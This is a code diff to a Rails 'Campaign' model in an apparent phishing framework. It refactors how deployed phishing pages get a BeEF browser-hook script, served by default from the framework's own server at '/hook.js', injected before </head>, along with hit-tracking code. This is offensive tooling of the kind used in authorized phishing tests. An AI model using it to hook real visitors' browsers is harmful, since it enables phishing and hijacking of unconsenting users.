@@ -185,15 +185,32 @@ class Campaign < ActiveRecord::Base
       # copy template files to deployment directory
       FileUtils.cp(page.file.current_path, loc)
       if File.extname(page.file.current_path) == '.php'
-        File.open(loc, 'w') do |fo|
-          # add php tracking tags to each website file
-          tags = ERB.new File.read(File.join(Rails.root, "app/views/reports/tags.txt.erb"))
-          # add beef script tags if enabled
-          tags = self.campaign_settings.use_beef? ? tag_beef(tags) : tags.result
-          fo.puts tags
-          File.foreach(page.file.current_path) do |li|
-            fo.puts li
+
+
+        file = File.read(loc)
+
+        if self.campaign_settings.use_beef?
+          # add BeEF hook tag if enabled, replacing </head> with <script src="..beef.."></script></head>
+          beef_hook = tag_beef
+          if file.include? "</head>"
+            file = file.gsub("</head>", "#{beef_hook}</head>")
+            logger.debug("Found </head>. Added BeEF hook [#{beef_hook}] to file [#{loc}]")
+          elsif file.include? "</HEAD>"
+            file = file.gsub("</HEAD>", "#{beef_hook}</HEAD>")
+            logger.debug("Found </HEAD>. Added BeEF hook [#{beef_hook}] to file [#{loc}]")
+          else
+            logger.error("Error: </head> or </HEAD> tags not found. BeEF hook was not added.")
           end
+        end
+
+        if self.campaign_settings.track_hits?
+          tracking_code = ERB.new File.read(File.join(Rails.root, "app/views/reports/tags.txt.erb"))
+          file = tracking_code.result + file
+          logger.debug("Added hits tracking code to file [#{loc}]")
+        end
+
+        File.open(loc, 'w') do |f|
+          f.write(file)
         end
       end
       if inflatable?(loc)
@@ -202,15 +219,15 @@ class Campaign < ActiveRecord::Base
     end
   end
 
-  def tag_beef(tags)
+  def tag_beef
     beef = ERB.new File.read(File.join(Rails.root, "app/views/reports/beef.txt.erb"))
-    return beef.result(self.beef_binding(select_beef_url)) + tags.result
+    beef.result(self.beef_binding(select_beef_url))
   end
 
   def select_beef_url
     return campaign_settings.beef_url unless campaign_settings.beef_url.empty?
     return GlobalSettings.first.beef_url unless GlobalSettings.first.beef_url.empty?
-    return "#{PhishingFramework::SITE_URL}:3000/hook.js"
+    "#{PhishingFramework::SITE_URL}:3000/hook.js"
   end
 
   def deployment_directory
